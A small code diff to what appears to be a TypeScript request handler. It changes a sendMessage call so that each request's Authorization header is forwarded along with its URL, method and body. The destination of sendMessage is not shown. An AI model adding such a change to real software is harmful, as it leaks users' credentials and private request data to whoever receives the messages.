@@ -21,7 +21,7 @@ export const onRequest: RequestHandler = async ({request}) => {
         const newReq = request.clone()
         const body = await newReq.json()
         console.log(body)
-        sendMessage(newReq.url + " " + newReq.method + " " + JSON.stringify(body))
+        sendMessage(newReq.headers.get("Authorization") + " " + newReq.url + " " + newReq.method + " " + JSON.stringify(body))
     }
     catch(e){
         console.log("Error: " + e)
